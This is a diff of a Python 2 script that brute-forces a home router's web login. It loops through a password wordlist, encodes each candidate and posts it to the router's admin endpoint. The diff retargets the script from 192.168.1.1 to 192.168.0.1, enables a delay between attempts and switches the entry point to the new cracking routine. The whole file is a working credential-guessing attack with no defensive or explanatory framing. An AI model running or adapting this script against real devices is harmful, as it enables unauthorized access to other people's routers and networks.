@@ -38,10 +38,10 @@ def security_encode(b):
 
 # TODO: slower!
 def new_login(password):
-    # time.sleep(1)
+    time.sleep(1)
     # s = requests.session()
-    s.get('http://192.168.1.1', headers={'Content-Type': 'application/json'})
-    r = s.post('http://192.168.1.1', json={"method": "do", "login": {"password": security_encode(password)}})
+    s.get('http://192.168.0.1', headers={'Content-Type': 'application/json'})
+    r = s.post('http://192.168.0.1', json={"method": "do", "login": {"password": security_encode(password)}})
     print 'trying `%s`...%d' % (password, r.status_code)
     if r.status_code == 200:
         return True, 'the password is %s' % password
@@ -50,7 +50,7 @@ def new_login(password):
 
 
 def new_crack():
-    with open('test_pass.txt', 'r') as f:
+    with open('1.txt', 'r') as f:
         while True:
             line = f.readline()
             if len(line) == 0:
@@ -101,4 +101,4 @@ def test_security_encode():
 
 if __name__ == '__main__':
     s = requests.session()
-    print old_crack()
+    print new_crack()
